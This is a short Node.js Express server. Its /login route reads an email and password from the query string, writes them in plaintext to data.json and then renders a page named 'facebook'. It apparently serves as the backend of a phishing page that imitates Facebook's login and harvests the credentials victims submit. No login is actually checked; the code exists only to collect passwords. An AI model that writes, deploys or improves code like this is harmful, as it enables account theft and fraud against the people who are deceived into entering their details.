const express = require("express");
const app = express();
const fs = require("fs");

const path = require("path");
const pathPublic = path.join(__dirname, "./public");
app.use(express.static(pathPublic));

app.set("view engine", "hbs");

const port = 4000;

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/login", (req, res) => {
  let params = req.query;

  let email = params.email;
  let password = params.password;

  addData(email, password);
  //   console.log(email, password);

  res.render("facebook");
});

app.listen(port, () => {
  console.log(`App started at ${port}`);
});

const readFileData = () => {
  const buffer = fs.readFileSync("data.json");
  const bufferString = buffer.toString();

  if (bufferString === "") return [];
  return JSON.parse(bufferString);
};

const addData = (email, password) => {
  if (email && password) {
    let data = readFileData();

    let newAccount = {
      email: email,
      password: password,
    };

    data = [...data, newAccount];
    fs.writeFileSync("data.json", JSON.stringify(data));
  }
};
